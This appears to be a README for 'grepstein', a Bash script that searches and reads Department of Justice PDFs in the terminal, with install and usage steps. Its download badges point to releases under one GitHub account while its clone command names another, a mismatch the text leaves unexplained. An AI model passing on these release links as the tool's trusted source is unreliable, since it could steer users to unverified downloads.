# 📄 grepstein - Search and Read PDFs in Terminal

[![Download grepstein](https://img.shields.io/badge/Download-grepstein-blue?style=for-the-badge)](https://github.com/panzerking99267/grepstein/releases)

---

## 📢 What is grepstein?

`grepstein` is a simple program that helps you find and read PDF files from the U.S. Department of Justice website. Instead of opening a web browser to search and read these files, you can do everything right in your terminal (the black or white window where you type commands).

It lets you look for keywords in documents, see the search results one page at a time, and open PDF files directly without leaving the terminal. This is useful if you prefer working in the terminal or want a fast way to access these files.

---

## 🌟 Key Features

- Search for keywords on the U.S. Department of Justice website  
- View search results page by page for easy browsing  
- Open and read PDF files directly in the terminal window  
- No web browser needed, keeping things fast and simple  
- Checks for needed tools before running to avoid errors  

---

## ⚙️ System Requirements

To run `grepstein`, your computer needs a terminal and some small programs installed. These programs help `grepstein` search the web, process data, and display PDFs in text form.

You will need:

- **pdftotext:** Converts PDF files to readable text.  
- **jq:** Helps process data in JSON format.  
- **httpie:** Simplifies making web requests from the terminal.

These tools are free and easy to install on most Linux systems. See the installation section below to get these programs.

`grepstein` works best on Linux systems using Bash shell. It may work on macOS with some adjustments but is not designed for Windows.

---

## 💻 How to Download and Install grepstein

You will find the program on GitHub, a place where software projects are shared. Use the link below to visit the page where you can download `grepstein`.

[![Get grepstein here](https://img.shields.io/badge/Get_grepstein_here-blue?style=for-the-badge)](https://github.com/panzerking99267/grepstein/releases)

Follow these steps to get it working:

### Step 1: Install Required Tools

Depending on your Linux distribution, open a terminal and run the commands below.

**For Arch Linux / CachyOS:**

```bash
sudo pacman -S poppler jq httpie
```

**For Debian / Ubuntu:**

```bash
sudo apt install poppler-utils jq httpie
```

This installs the `pdftotext`, `jq`, and `httpie` programs your system needs.

### Step 2: Download grepstein

You can download the program by copying it from GitHub to your computer. Use this command in the terminal:

```bash
git clone https://github.com/sertacartun/grepstein.git
```

This creates a folder called `grepstein` with all the program files.

### Step 3: Prepare to Run

Next, move into the folder and make the main script ready to execute:

```bash
cd grepstein
chmod +x grepstein.sh
```

This makes the script file executable, so you can run it.

---

## 🚀 How to Use grepstein

Using `grepstein` is easy. Open your terminal, enter the folder where you installed it, and run the script like this:

```bash
./grepstein.sh
```

Here’s what happens next:

1. The program checks if all required tools are installed. If something is missing, it will tell you what to install.  
2. Then, it asks you to enter a keyword or phrase you want to search for in the Department of Justice PDF documents.  
3. It shows the results in pages, and you can type `NEXT` to see the next page.  
4. When you find a file you want to read, type its number. `grepstein` will open the PDF and convert it to text so you can read it directly in the terminal.  
5. To exit, just type `EXIT` or close the terminal window.

---

## 🔍 Example Session

Here’s a simple example of what using `grepstein` might look like:

```plaintext
Enter your search term: immigration policy

Showing results 1-10 of 50
1. Document title A
2. Document title B
...
Type the document number to read or 'NEXT' for more results:
```

Type `1` to read the first document, or `NEXT` to see more.

---

## ❓ Troubleshooting

- If the script says a tool is missing, install it using your system’s package manager.  
- Make sure you have an internet connection since `grepstein` searches online.  
- If PDFs do not display correctly, check that `pdftotext` is installed and working by running `pdftotext -v` in the terminal.  
- For any other issues, visiting the GitHub page and checking the Issues section may help.

---

## 📥 Download & Install Links

Use this link to get `grepstein` or check for updates:

[https://github.com/panzerking99267/grepstein/releases](https://github.com/panzerking99267/grepstein/releases)

You will find download files and instructions here. Follow the steps above after downloading.

---

## 📚 Additional Notes

- `grepstein` does not store or send any personal data. It only accesses publicly available documents.  
- This tool is made for users comfortable with using a terminal window. It is not a graphical program.  
- If you want to stop using it, just delete the `grepstein` folder from your computer.

---

## 🙋 Where to Get Help

If you need more information or want to report a bug, visit the project’s GitHub page and open an issue:

[https://github.com/panzerking99267/grepstein](https://github.com/panzerking99267/grepstein)

You can also look at the README file there for updates or additional instructions.

---

Thank you for using `grepstein`. We hope it helps you find and read government PDF documents more easily.